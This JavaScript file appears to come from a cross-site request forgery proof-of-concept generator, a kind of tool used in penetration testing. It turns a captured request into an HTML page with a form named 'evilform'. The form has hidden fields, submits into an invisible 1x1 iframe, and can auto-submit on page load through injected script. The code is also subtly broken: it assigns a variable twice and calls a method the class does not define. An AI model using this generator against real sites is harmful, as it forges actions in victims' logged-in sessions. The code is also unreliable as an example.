var formfunc = /** @class */ (function () {
    function formfunc() {
    }
    formfunc.prototype.generate = function () {
        return false;
    };
    formfunc.prototype.generateHTML = function (title, bodyhtml) {
        return "";
    };
    formfunc.prototype.send = function () {
        return false;
    };
    formfunc.prototype.sendFunc = function () {
        return false;
    };
    return formfunc;
}());
var forfunc = {
    generate: function () {
        var ezhtml = "";
        var req = getRequest();
        if (req === false)
            return false;
        ezhtml += '<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="' + req['enctype'] + '">\n';
        var params = req['params'];
        for (var i = 0; i < params.length; i++) {
            ezhtml += HTMLrender.input(URLdecode(params[i][0]), URLdecode(params[i][1]), ((!isAutoSubmit() && isSpecifiable()) ? ("text") : ("hidden"))) + "\n";
        }
        ezhtml += '</form>\n';
        ezhtml += '<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
        setEvilHTMLcontent(ezhtml);
        setEvilTextContent(ezhtml);
        errorMsg("");
        return true;
    },
    generateHTML: function (title, bodyhtml) {
        var content = getHTMLheader(title) + "\n<body" + ((isAutoSubmit()) ? ' onload="csrfSubmit();' : '') + ">\n" + bodyhtml + ((!isAutoSubmit()) ? '<button onclick="csrfSubmit();">submit</button>' : '') + "\n" + this.sendFunction() + "\n<p>" + title + "</p>\n" + getHTMLfooter() + "\n";
        var content = getHTMLheader(title);
        content += '<body';
        if (isAutoSubmit())
            content += ' onload="csrfSubmit();"';
        content += '>\n';
        content += bodyhtml;
        if (!isAutoSubmit()) {
            content += '<button onclick="csrfSubmit();">submit</button>\n';
        }
        content += formfunc.sendFunction();
        content += '\n<p>' + title + '</p>\n';
        content += '</body>\n';
        content += getHTMLfooter();
        return content;
    },
    send: function () {
        var req = getRequest();
        document.getElementById("stat").innerHTML += "<p>Request sent.</p><p>" + escapeHTML(req['url']) + "</p><p>" + escapeHTML(req['params']) + "</p><hr />";
        var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
        submit();
    },
    sendFunction: function () {
        var content = '<sc' + 'ript>\n';
        content += 'function csrfSubmit(){\n';
        content += 'let submit = HTMLFormElement.prototype["submit"].bind(document.evilform);\n';
        content += 'submit();\n';
        content += '}\n';
        content += '</sc' + 'ript>\n';
        return content;
    }
};
function getHTMLheader(title) {
    if (title === void 0) { title = "CSRF PoC"; }
    var content = "<!DOCTYPE html>\n\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>" + title + "</title>\n</head>\n";
    return content;
}
function getHTMLfooter() {
    var content = '</html>\n';
    return content;
}
//# sourceMappingURL=sendfunc.js.map